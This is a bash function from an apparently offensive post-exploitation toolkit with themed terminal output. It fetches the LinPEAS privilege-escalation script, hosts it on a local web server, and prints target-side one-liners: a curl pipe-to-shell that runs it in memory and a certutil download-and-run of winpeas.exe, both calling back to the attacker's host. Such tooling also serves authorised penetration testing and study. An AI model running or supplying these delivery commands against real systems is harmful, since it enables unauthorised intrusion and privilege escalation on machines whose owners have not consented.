#!/bin/bash

run_peas_delivery() {
    if [ -z "${STATE[lhost]}" ]; then
        configure_network_parameters
    fi

    local lhost="${STATE[lhost]}"
    local lport="8000"
    local peas_dir="${BASE_DIR}/core/peas"

    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// POST-EXPLOITATION MATRIX ACTIVE ]${TXT_VOID}──────────────────────────────╖${NC}"
    local sep_mid="${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────╢${NC}"
    local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────╜${NC}"

    mkdir -p "$peas_dir" 2>/dev/null

    if [ ! -f "${peas_dir}/linpeas.sh" ]; then
        echo -e "\n${TXT_VOID}╓──────────────────────────────────────────────────────────────────────────────╖${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ~ ] DEPENDENCY VOID DETECTED: linpeas.sh missing${NC}                       ${TXT_VOID}║${NC}"
        echo -e "${TXT_VOID}║${NC}   ${TXT_MID_RED}[ i ] FETCHING INTRUSION TEMPLATE FROM CYBERSPACE RESOURCE...${NC}              ${TXT_VOID}║${NC}"
        echo -e "${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────╜${NC}"
        curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" -o "${peas_dir}/linpeas.sh"
    fi

    python3 -m http.server "$lport" --directory "$peas_dir" > /dev/null 2>&1 &
    local server_pid=$!

    STATE[web_server_pid]="$server_pid"

    echo -e "\n$sep"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// EFUSE KERNEL MEMORY ENGAGED${NC}"
    echo -e "${TXT_VOID}╟─${TXT_MID_RED}[ i ] LOCAL HOSTING VECTOR ONLINE:${NC} ${TXT_RED_SUPERNOVA}http://${lhost}:${lport}${NC}"
    echo -e "${TXT_VOID}│${NC}"

    echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ Linux Synaptic Extraction (Memory execution): ]${NC}"
    echo -e "${TXT_VOID}│${NC}   ${TXT_B_LASER}curl -s http://${lhost}:${lport}/linpeas.sh | sh${NC}"
    echo -e "${TXT_VOID}│${NC}"
    echo -e "${TXT_VOID}├─${TXT_RED_ALARM}[ Windows Synaptic Extraction (Download & Run): ]${NC}"
    echo -e "${TXT_VOID}│${NC}   ${TXT_B_ALARM}certutil -urlcache -f http://${lhost}:${lport}/winpeas.exe winpeas.exe && winpeas.exe${NC}"
    echo -e "${TXT_VOID}│${NC}"
    echo -e "${TXT_VOID}├─${TXT_RED_PLASMA}[ ! ] SEVER THE LINK PROTOCOL:${NC}"
    echo -e "${TXT_VOID}│${NC}   ${TXT_RED_LASER}Press ENTER to collapse local server and reclaim memory space...${NC}"
    echo -e "$sep_bot\n\n"

    ai_speak "Deliver the simulacrum. Let them analyze their own ruin."
    read -r

    kill "$server_pid" 2>/dev/null
    wait "$server_pid" 2>/dev/null
}